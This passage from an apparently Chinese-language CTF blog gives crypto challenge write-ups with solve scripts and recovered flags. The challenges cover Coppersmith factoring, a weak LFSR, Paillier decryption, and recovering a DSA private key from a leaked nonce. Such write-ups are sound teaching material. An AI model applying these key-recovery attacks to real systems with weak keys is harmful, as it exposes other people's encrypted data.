size(n) // 4)</code>对应的参数可能又不相同…这里暂未实验</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coppersmith_univariate</span><span class="params">(f, n, beta, mm, tt, XX)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(f.is_monic() <span class="keyword">and</span> <span class="number">0</span> &lt; beta &lt;= <span class="number">1</span>)</span><br><span class="line">    <span class="comment">#epsilon = beta / 7</span></span><br><span class="line">    dd = f.degree() <span class="comment"># degree of polynomial</span></span><br><span class="line">    <span class="comment">#mm = ceil(beta**2 / (dd * epsilon)) # optimized param</span></span><br><span class="line">    <span class="comment">#tt = floor(dd * mm * (1 / beta - 1)) # optimized param</span></span><br><span class="line">    <span class="comment">#XX = ceil(n**(beta**2 / dd - epsilon)) # |x| &lt; XX</span></span><br><span class="line">    nn = mm * dd + tt</span><br><span class="line">    <span class="comment"># change ring of f and x to ZZ</span></span><br><span class="line">    fZ = f.change_ring(ZZ)</span><br><span class="line">    x = fZ.parent().gen()</span><br><span class="line">    <span class="comment"># instruct matrix</span></span><br><span class="line">    A_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(mm):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(dd):</span><br><span class="line">            A_list.append((XX * x)**j * n**(mm - i) * fZ(XX * x)**i)</span><br><span class="line">    A_list += [(XX * x)**i * fZ(XX * x)**mm <span class="keyword">for</span> i <span class="keyword">in</span> range(tt)]</span><br><span class="line">    A = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(nn):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i + <span class="number">1</span>):</span><br><span class="line">            A[i, j] = A_list[i][j]</span><br><span class="line">    <span class="comment"># LLL to solve SVP</span></span><br><span class="line">    AL = A.LLL(early_red=<span class="literal">True</span>, use_siegel=<span class="literal">True</span>)</span><br><span class="line">    f_smaller = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(nn):</span><br><span class="line">        f_smaller += (AL[<span class="number">0</span>, i] * x**i) / (XX**i)</span><br><span class="line">    candidates = f_smaller.roots()</span><br><span class="line">    roots = []</span><br><span class="line">    <span class="keyword">for</span> root, _ <span class="keyword">in</span> candidates:</span><br><span class="line">        <span class="keyword">if</span> root.is_integer():</span><br><span class="line">            res = fZ(ZZ(root))</span><br><span class="line">            <span class="keyword">if</span> gcd(res, n) &gt;= n**beta: <span class="comment"># module's size satisfies</span></span><br><span class="line">                roots.append(ZZ(root))</span><br><span class="line">    <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">M_smaller, order = Gen_M_smaller(M, <span class="number">512</span> // <span class="number">4</span>)</span><br><span class="line">c = discrete_log(Mod(n, M_smaller), Mod(<span class="number">65537</span>, M_smaller))</span><br><span class="line"></span><br><span class="line">PR.&lt;k&gt; = PolynomialRing(Zmod(n), implementation=<span class="string">'NTL'</span>)</span><br><span class="line">beta = <span class="number">0.48</span></span><br><span class="line">mm = <span class="number">5</span></span><br><span class="line">tt = <span class="number">6</span></span><br><span class="line">XX = int((<span class="number">2</span> * n**beta) / M_smaller)</span><br><span class="line"><span class="comment">#XX = ceil(n**(beta**2 - beta/7))</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> tqdm(range(c // <span class="number">2</span>, (c + order) // <span class="number">2</span>)):</span><br><span class="line">    f = k * M_smaller + Integer(pow(<span class="number">65537</span>, a, M_smaller))</span><br><span class="line">    roots = coppersmith_univariate(f.monic(), n, beta, mm, tt, XX)</span><br><span class="line">    <span class="keyword">if</span> len(roots):</span><br><span class="line">        print(roots[<span class="number">0</span>])</span><br><span class="line">        print(gcd(roots[<span class="number">0</span>] * M_smaller + Integer(pow(<span class="number">65537</span>, a, M_smaller)), n))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">  0%|          | 5/600600 [00:00&lt;17:58:28,  9.28it/s]</span></span><br><span class="line"><span class="string">1426982562847111986146541</span></span><br><span class="line"><span class="string">3386619977051114637303328519173627165817832179845212640767197001941</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>coppersmith分解n成功，后续略</p><h4 id="More-1"><a href="#More-1" class="headerlink" title="[More]"></a>[More]</h4><p>coppersmith求解的参数$(mm,tt)$在不同情况也要不用调参，后续我以一个有更小order的M’(17304344567133368654502628603056098610)进行了参数估计（利用已知满足coppersmith条件的f进行测试）</p><p><img src= "/img/loading.gif" data-src="/2020/04/30/CTF-Training-Record-1/Snipaste_2020-05-27_01-30-44.png" alt></p><p>基于复杂度考虑，选取$(mm,tt)=(10,11)$.</p><p><img src= "/img/loading.gif" data-src="/2020/04/30/CTF-Training-Record-1/Snipaste_2020-05-27_01-33-06.png" alt></p><p>但是可以看到这里在阶减小的同时，mm,tt也增大，意味着LLL的矩阵扩大，求解时间并没有太大的变化- -</p><p>这题的数据应该是出题人generate的一组较易求解的p，q（因为我们发现在爆破a的时候，其最差时间约18h，但a能在很小的时候即符合）</p><p>coppersmith这东西…调参就很玄（刚刚提到的$(mm,tt)=(10,11)$求解成功的f，在直接small_roots时即求解失败- -其实可以用来出题埋一手坑(x)）</p><p><img src= "/img/loading.gif" data-src="/2020/04/30/CTF-Training-Record-1/Snipaste_2020-05-27_01-45-05.png" alt></p><h3 id="Unknown-name-Crypto-Challenge-2020-08-10"><a href="#Unknown-name-Crypto-Challenge-2020-08-10" class="headerlink" title="Unknown-name Crypto Challenge(2020/08/10)"></a>Unknown-name Crypto Challenge(2020/08/10)</h3><h4 id="题目考点-3"><a href="#题目考点-3" class="headerlink" title="[题目考点]"></a>[题目考点]</h4><ul><li>化简能力- -||</li></ul><h4 id="题解分析-3"><a href="#题解分析-3" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p><strong>Encryption</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">"KEYIS&#123;xxxxxxxxxxxxxxxx&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(R,mask)</span>:</span></span><br><span class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    output^=lastbit</span><br><span class="line">    <span class="keyword">return</span> (output,lastbit)</span><br><span class="line"></span><br><span class="line">mask = int(os.urandom(<span class="number">4</span>).encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">R = int(os.urandom(<span class="number">4</span>).encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">iv = int(os.urandom(<span class="number">4</span>).encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">enc = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    R,m = lfsr(R,mask)</span><br><span class="line">    x = R ^ iv</span><br><span class="line">    x ^= x &gt;&gt; <span class="number">16</span></span><br><span class="line">    x ^= x &gt;&gt; <span class="number">8</span></span><br><span class="line">    x = x &amp; <span class="number">255</span></span><br><span class="line">    enc += chr(ord(i)^x)</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2020/04/30/CTF-Training-Record-1/Snipaste_2020-08-10_23-38-54.png" alt></p><ol><li><p>由于iv是fixed的，所以可以简化为8bits的new_iv，在最后异或即可</p></li><li><p>R, _ = lfsr(R, mask)，因此也可简化为8bits的new_R, _ = new_lfsr(new_R)</p><p>注：这里的new_lfsr实际上已非lfsr，但仍保持如下性质</p><p><img src= "/img/loading.gif" data-src="/2020/04/30/CTF-Training-Record-1/Snipaste_2020-08-10_23-54-47.png" alt></p><p>即经new_LFSR后，<code>new_R = ((new_R &lt;&lt; 1) &amp; 0xff) | random_bit</code></p></li></ol><p>因此可将上述化简为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">new_R = new_lfsr(new_R)</span><br><span class="line">x = new_R ^ new_iv</span><br><span class="line">enc += chr(ord(i) ^ x)</span><br></pre></td></tr></table></figure><p>故对<strong>密钥流</strong>有以下递推关系：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">prev = R ^ new_iv</span><br><span class="line">curr = (((R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xff</span>) | random_bit) ^ new_iv</span><br><span class="line">(prev &amp; <span class="number">0x7f</span>) = (R &amp; <span class="number">0x7f</span>) ^ (new_iv &amp; <span class="number">0x7f</span>)</span><br><span class="line">(curr &gt;&gt; <span class="number">1</span>) = (R &amp; <span class="number">0x7f</span>) ^ (new_iv &gt;&gt; <span class="number">1</span>)</span><br><span class="line">(prev &amp; <span class="number">0x7f</span>) ^ (curr &gt;&gt; <span class="number">1</span>) = (new_iv &amp; <span class="number">0x7f</span>) ^ (new_iv &gt;&gt; <span class="number">1</span>) <span class="comment"># new_iv -&gt; constant</span></span><br></pre></td></tr></table></figure><p>但curr的最低比特未知，flag内芯为小写md5，因此递归作判断即可</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"></span><br><span class="line">flag_charset = <span class="string">b"0123456789abcdef"</span></span><br><span class="line">cipher = unhexlify(<span class="string">b"3bcd21d009a7e0ad9fa6718cd6310ed06a13bd589e0963"</span>)</span><br><span class="line">prefix = <span class="string">b"S&#123;"</span></span><br><span class="line">suffix = <span class="string">b"&#125;"</span></span><br><span class="line">constant = ((prefix[<span class="number">0</span>] ^ cipher[<span class="number">4</span>]) &amp; <span class="number">0x7f</span>) ^ ((prefix[<span class="number">1</span>] ^ cipher[<span class="number">5</span>]) &gt;&gt; <span class="number">1</span>)</span><br><span class="line">pre = prefix[<span class="number">1</span>] ^ cipher[<span class="number">5</span>]</span><br><span class="line">flag = <span class="string">"KEYIS&#123;"</span></span><br><span class="line">cipher = cipher[<span class="number">6</span>:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">(flag, pre, constant, i)</span>:</span></span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    cur = ((pre &amp; <span class="number">0x7f</span>) ^ constant) &lt;&lt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">16</span> <span class="keyword">and</span> chr((cur + <span class="number">1</span>) ^ cipher[i]) == <span class="string">'&#125;'</span> <span class="keyword">or</span> chr(cur ^ cipher[i]) == <span class="string">'&#125;'</span>:</span><br><span class="line">        print(flag + <span class="string">'&#125;'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> (cur ^ cipher[i]) <span class="keyword">in</span> flag_charset:</span><br><span class="line">            getflag(flag + chr(cur ^ cipher[i]), cur, constant, i + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> ((cur + <span class="number">1</span>) ^ cipher[i]) <span class="keyword">in</span> flag_charset:</span><br><span class="line">            getflag(flag + chr((cur + <span class="number">1</span>) ^ cipher[i]), cur + <span class="number">1</span>, constant, i + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">getflag(flag, pre, constant, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># KEYIS&#123;1fa32bc3ccee9872&#125;</span></span><br></pre></td></tr></table></figure><h4 id="More-2"><a href="#More-2" class="headerlink" title="[More]"></a>[More]</h4><p>并不知道是什么赛事的题目- -好多师傅都在问，出题思路和X-MAS CTF基本相同，主要考察点即为化简</p><p><a href="https://github.com/pberba/ctf-solutions/blob/8eb87af5bb2fbf7af683c7fd79d7979f032b7ae9/20181223_xmasctf/crypto-460-probably_really_nice_goodies/README.md" target="_blank" rel="noopener">https://github.com/pberba/ctf-solutions/blob/8eb87af5bb2fbf7af683c7fd79d7979f032b7ae9/20181223_xmasctf/crypto-460-probably_really_nice_goodies/README.md</a></p><h3 id="CISCN2018-sm"><a href="#CISCN2018-sm" class="headerlink" title="CISCN2018 - sm"></a>CISCN2018 - sm</h3><h4 id="题目文件-2"><a href="#题目文件-2" class="headerlink" title="[题目文件]"></a>[题目文件]</h4><p><a href="sm.zip">Click Here to Download</a></p><h4 id="题解分析-4"><a href="#题解分析-4" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p><strong>Encryption</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen512num</span><span class="params">()</span>:</span></span><br><span class="line">    order = shuffle(list(range(<span class="number">1</span>, <span class="number">513</span>)))</span><br><span class="line">    ps = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">512</span>):</span><br><span class="line">        p = getPrime(<span class="number">512</span> - order[i] + <span class="number">10</span>)</span><br><span class="line">        pre = bin(p)[<span class="number">2</span>:][<span class="number">0</span>:(<span class="number">512</span>-order[i])] + <span class="string">"1"</span></span><br><span class="line">        ps.append(int(pre + <span class="string">"0"</span> * (<span class="number">512</span> - len(pre)), <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> ps</span><br></pre></td></tr></table></figure><p>可以看到<code>gen512num</code>返回的ps数组中，均为512bits的随机数，但存在下列关系：</p><p>for $p\in ps$，bin(p)[2:]的suffix均满足’1’+i*’0’ $(i\in [0,511])$，且i互不重复</p><p>choose为长度512的01向量，按如下规则leak出信息r</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">512</span>):</span><br><span class="line">    <span class="keyword">if</span> bchoose[i]==<span class="string">'1'</span>:</span><br><span class="line">        r = r ^ ps[i]</span><br></pre></td></tr></table></figure><p>且题目给出ps，又有上述ps特性，即可从r末位比特向前恢复出choose</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = <span class="number">6753785483255906709117615805253027649453460653974415214642466102672301763943358839905575042938258141827000621474498066533397472809407687579125519939754658</span></span><br><span class="line">ps = []</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"ps"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        ps.append(int(line[:<span class="number">-1</span>]))</span><br><span class="line">ps_dict = dict() <span class="comment"># ps_dict[i]'s suffix satisfies '1' + i * '0'</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> ps:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">512</span>):</span><br><span class="line">        <span class="keyword">if</span> ((<span class="number">2</span>**i) &amp; p) != <span class="number">0</span>:</span><br><span class="line">            ps_dict[i] = p</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">choose = [<span class="number">0</span>] * <span class="number">512</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">512</span>):</span><br><span class="line">    <span class="keyword">if</span> ((<span class="number">2</span>**i) &amp; r) != <span class="number">0</span>:</span><br><span class="line">        r ^= ps_dict[i]</span><br><span class="line">        choose[ps.index(ps_dict[i])] = <span class="number">1</span></span><br><span class="line">choose = int(<span class="string">''</span>.join(str(_) <span class="keyword">for</span> _ <span class="keyword">in</span> choose), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">key = long_to_bytes(int(md5(long_to_bytes(choose)).hexdigest(), <span class="number">16</span>))</span><br><span class="line">aes_obj = AES.new(key, AES.MODE_ECB)</span><br><span class="line">cipher = b64decode(<span class="string">b"5eFo3ANg2fu9LRrFktWCJmVvx6RgBFzd0R8GXQ8JD78="</span>)</span><br><span class="line">flag = aes_obj.decrypt(cipher)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b'flag&#123;shemir_alotof_in_wctf_fun!&#125;'</span></span><br></pre></td></tr></table></figure><h4 id="More-3"><a href="#More-3" class="headerlink" title="[More]"></a>[More]</h4><p>临近2020国赛了 :(</p><p>赛前找了些往年的cry题看了看- -难度上几乎比不上其他国际赛，但是有些风格奇奇怪怪</p><p>Training系列的博文就以一篇5题为规范吧，希望国赛人没事</p><p><strong>END</strong></p>]]></content>
      
      
      <categories>
          
          <category> Training </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(DASCTF四月春季赛) - Crypto</title>
      <link href="/2020/04/25/WriteUp-DASCTF%E5%9B%9B%E6%9C%88%E6%98%A5%E5%AD%A3%E8%B5%9B-Crypto/"/>
      <url>/2020/04/25/WriteUp-DASCTF%E5%9B%9B%E6%9C%88%E6%98%A5%E5%AD%A3%E8%B5%9B-Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="not-RSA"><a href="#not-RSA" class="headerlink" title="not_RSA"></a>not_RSA</h3><h4 id="题目考点"><a href="#题目考点" class="headerlink" title="[题目考点]"></a>[题目考点]</h4><ul><li>Paillier cryptosystem</li></ul><h4 id="题目文件"><a href="#题目文件" class="headerlink" title="[题目文件]"></a>[题目文件]</h4><p><a href="2004225e9ff0cc3c4c4.py">Click Here to Download</a></p><h4 id="题解分析"><a href="#题解分析" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>从$Z_{n}\times Z_{n}^{<em>}$到$Z_{n^{2}}^{</em>}$存在双射关系$(x,y)\rightarrow g^{x}y^{n}(mod\ n^{2})$</p><p>Paillier cryptosystem系统加解密流程如下：</p><p><img src= "/img/loading.gif" data-src="/2020/04/25/WriteUp-DASCTF%E5%9B%9B%E6%9C%88%E6%98%A5%E5%AD%A3%E8%B5%9B-Crypto/Snipaste_2020-04-25_23-32-48.png" alt></p><p>which $\lambda =lcm(p-1,q-1),L(u)=\frac{u-1}{n}$</p><p><strong>Proof：</strong> </p><p>$g\in Z_{n^{2}}^{*},\quad\therefore \exists(a, b),s.t.\ g=(n+1)^{a}b^{n}(mod\ n^{2})$</p><p>$c^{\lambda}=(n+1)^{am\lambda}b^{nm\lambda}r^{n\lambda}=(n+1)^{am\lambda}=1+am\lambda n(mod\ n^{2})$</p><p>$L(c^{\lambda}\ mod\ n^{2})=am\lambda$，同理$L(g^{\lambda}\ mod\ n^{2})=a\lambda$，证毕</p><p>本题$g=n+1$，且n可以直接Fermat分解得到pq，按上述方法解密即可</p><h4 id="exp"><a href="#exp" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">80006336965345725157774618059504992841841040207998249416678435780577798937819</span></span><br><span class="line">q = <span class="number">80006336965345725157774618059504992841841040207998249416678435780577798937447</span></span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="number">29088911054711509252215615231015162998042579425917914434962376243477176757448053722602422672251758332052330100944900171067962180230120924963561223495629695702541446456981441239486190458125750543542379899722558637306740763104274377031599875275807723323394379557227060332005571272240560453811389162371812183549</span></span><br><span class="line">lcm = ((p - <span class="number">1</span>) * (q - <span class="number">1</span>)) // GCD(p - <span class="number">1</span>, q - <span class="number">1</span>)</span><br><span class="line">a = (pow(c, lcm, n * n) - <span class="number">1</span>) // n</span><br><span class="line">b = (pow(n + <span class="number">1</span>, lcm, n * n) - <span class="number">1</span>) // n</span><br><span class="line">m = long_to_bytes((a * inverse(b, n)) % n)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><h4 id="More"><a href="#More" class="headerlink" title="[More]"></a>[More]</h4><p>单从这道题本身来看，其实不了解这个密码系统也可，因为$g=n+1$，且$r^{n\cdot lcm(p-1)(q-1)}\equiv 1(mod\ n^{2})$，所以$c^{lcm}\rightarrow$  二项式定理即可得$m\cdot lcm(mod\ n)$</p><h3 id="Complex-Encode"><a href="#Complex-Encode" class="headerlink" title="Complex Encode"></a>Complex Encode</h3><h4 id="题目考点-1"><a href="#题目考点-1" class="headerlink" title="[题目考点]"></a>[题目考点]</h4><ul><li>有限域开根</li><li>其他RSA/DSA基础知识</li></ul><h4 id="题目文件-1"><a href="#题目文件-1" class="headerlink" title="[题目文件]"></a>[题目文件]</h4><p><a href="2004225e9ff0cc9e73b.zip">Click Here to Download</a></p><h4 id="题解分析-1"><a href="#题解分析-1" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>套娃题- -流程捋顺也就出来了</p><p>Step 1：RSA加密，且$GCD(phi_{1},e_{1})=random.randint(3, 12)$，$p_{1}$作为泄露信息进入Step2</p><p>Step 2：$p_{1}$作为DSA Signature的私钥，对rsaEncode2(false_flag)签名，并返回</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sig = r.to_bytes(<span class="number">205</span>, <span class="string">'big'</span>) + s.to_bytes(<span class="number">205</span>, <span class="string">'big'</span>) + k.to_bytes(<span class="number">205</span>, <span class="string">'big'</span>)+ q.to_bytes(<span class="number">205</span>, <span class="string">'big'</span>)</span><br><span class="line">f.write(<span class="string">"dsaEncode :"</span>+base64.b64encode(sig).decode()+<span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure><p>Step 3：Step 2中的rsaEncode2(false_flag)来自于第二个RSA加密系统的返回值，可以看到gen_prime时用了next_prime，费马分解得到$p_{2},q_{2}$，且发现$GCD(e_{2},phi_{2})=41$，因此先得到了$m_{2}^{41}(mod\ n_{2})$，$F_{p_{2}},F_{q_{2}}$上对$c_{2}$开41次根，并对所有组合crt即可还原$m_{2}$（<code>b&#39;flag{T0o_YoUn9_to0_4imP1e}&#39;</code>），但无意义，该rsa系统返回值为$m_{2}^{41}(mod\ n_{2})$，fine</p><p>Step 2中(r, s, k, q, m)均已知，可直接求出私钥x，也即为$p_{1}$</p><p>再对第一个RSA系统常规解密得到$m_{1}^{5}$，最后有限域开根crt拿到flag</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第二个RSA解密略</span></span><br><span class="line">m2 = bytes_to_long(<span class="string">b'flag&#123;T0o_YoUn9_to0_4imP1e&#125;'</span>)</span><br><span class="line">ran2 = <span class="number">41</span></span><br><span class="line">rsaEnc2 = pow(m2, ran2, n2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line">sig = <span class="string">b'...'</span></span><br><span class="line">sig = b64decode(sig)</span><br><span class="line">r = bytes_to_long(sig[:<span class="number">205</span>])</span><br><span class="line">s = bytes_to_long(sig[<span class="number">205</span>:<span class="number">410</span>])</span><br><span class="line">k = bytes_to_long(sig[<span class="number">410</span>:<span class="number">615</span>])</span><br><span class="line">q = bytes_to_long(sig[<span class="number">615</span>:<span class="number">820</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">Hm = int.from_bytes(hashlib.md5(str(rsaEnc2).encode(<span class="string">'utf-8'</span>)).hexdigest().encode(), <span class="string">'big'</span>)</span><br><span class="line">x = ((s * k - Hm) % q) * inverse(r, q)</span><br><span class="line">n1 = ...</span><br><span class="line">p1 = x % q</span><br><span class="line">q1 = n1 // p1</span><br><span class="line">e1 = <span class="number">0x12a316381</span></span><br><span class="line">c1 = ...</span><br><span class="line"><span class="keyword">assert</span>(GCD(e1, (p1 - <span class="number">1</span>)*(q1 - <span class="number">1</span>)) == <span class="number">5</span>)</span><br><span class="line">d1 = inverse(e1 // <span class="number">5</span>, (p1 - <span class="number">1</span>) * (q1 - <span class="number">1</span>))</span><br><span class="line">m1_5 = pow(c1, d1, 